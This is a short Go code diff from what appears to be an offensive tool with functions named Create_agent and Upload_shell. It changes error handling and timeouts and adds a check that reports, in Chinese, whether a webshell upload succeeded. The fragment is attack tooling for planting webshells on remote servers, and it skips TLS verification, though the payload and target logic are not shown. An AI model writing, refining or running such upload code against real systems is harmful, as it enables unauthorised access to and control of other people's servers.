@@ -64,9 +64,12 @@ func Create_agent(url, log_param, agent_name string) {
 		SetBody(body).
 		Post(target)
 	if err != nil {
+		if strings.Contains(err.Error(), "Timeout") {
 
-		fmt.Println("[-] 上传失败，请检查网络.")
-		return
+		} else {
+			fmt.Println("[-] 上传失败，请检查网络.")
+			os.Exit(0)
+		}
 
 	}
 	_ = resp
@@ -101,7 +104,7 @@ func Upload_shell(url, log_param, agent_name, wb_str string) {
 	// fmt.Println(jsonText)
 	client := req.C().DisableDumpAll().DisableDebugLog()
 	client.DisableAutoDecode()
-	client.SetTimeout(2 * time.Second)
+	client.SetTimeout(6 * time.Second)
 	client.EnableInsecureSkipVerify()
 	client.EnableForceHTTP1()
 	client.SetUserAgent(user_agent)
@@ -110,10 +113,21 @@ func Upload_shell(url, log_param, agent_name, wb_str string) {
 		SetBody(data).
 		Post(tarGet)
 	if err != nil {
-		fmt.Println("[-] 上传失败，请检查网络.")
-		return
+		if strings.Contains(err.Error(), "Timeout") {
+
+		} else {
+			fmt.Println("[-] 上传失败，请检查网络.")
+			os.Exit(0)
+		}
 	}
-	_ = resp
+	if resp.StatusCode == 201 || resp.StatusCode == 200 {
+
+		fmt.Println("[+] 上传成功，检查Webshell...")
+	} else {
+		// fmt.Println(resp.StatusCode)
+		fmt.Println("[-] 上传失败.")
+		os.Exit(0)
+	}
 
 }
 
